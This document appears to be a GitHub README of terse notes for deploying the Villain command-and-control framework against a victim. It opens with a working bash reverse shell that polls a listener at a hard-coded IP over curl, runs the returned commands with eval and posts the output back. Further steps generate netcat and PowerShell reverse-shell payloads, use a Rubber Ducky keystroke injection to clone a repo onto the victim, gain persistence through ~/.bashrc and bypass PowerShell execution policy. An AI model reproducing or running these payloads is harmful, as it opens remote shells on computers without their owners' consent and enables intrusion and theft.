### its_villain
## villain payload example 
```
nohup bash -c 's=192.168.178.44:8080&&i=ec36c7-343e27-7061a4&&hname=$(hostname)&&p=http://;curl -s "$p$s/ec36c7/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/343e27" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/7061a4 -X POST -H "Authorization: $i" -d "$r";echo $$;fi; fi; sleep 0.8; done;' & disown
```
update & upgr -y
## attacker 
git clone villain (kali apt install villain)
pip3 install -r requirements.txt

try:
chmod +x villain.py

```
generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 encode
generate payload=linux/hoaxshell/sh_curl lhost=eth0
```

## victim
# rubberducky
ALT CTRL T

git clone https://github.com/dad1x/its_villain/
cd its_villain
chmod +x ja.sh

# add lines to bashrc
```
echo "<COMMAND>" >> ~/.bashrc
```

paste payload WINDOWS EXAMPLE:
```
generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 encode
```
based on: https://github.com/antonioCoco/ConPtyShell
```
powershell -ep bypass -e 
```
